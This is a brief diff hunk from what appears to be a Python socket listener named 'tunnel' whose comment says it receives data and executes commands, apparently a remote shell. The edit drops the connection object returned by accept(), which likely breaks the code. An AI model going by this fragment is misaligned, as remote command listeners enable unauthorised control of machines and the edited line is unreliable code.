@@ -11,7 +11,7 @@ tunnel.bind(server)
 tunnel.listen(5)
 
 while True:
-    connection, client_address = tunnel.accept()
+    client_address = tunnel.accept()
     try:
         ### Receive data in 1024 byte packages and execute commands ###
         while True:
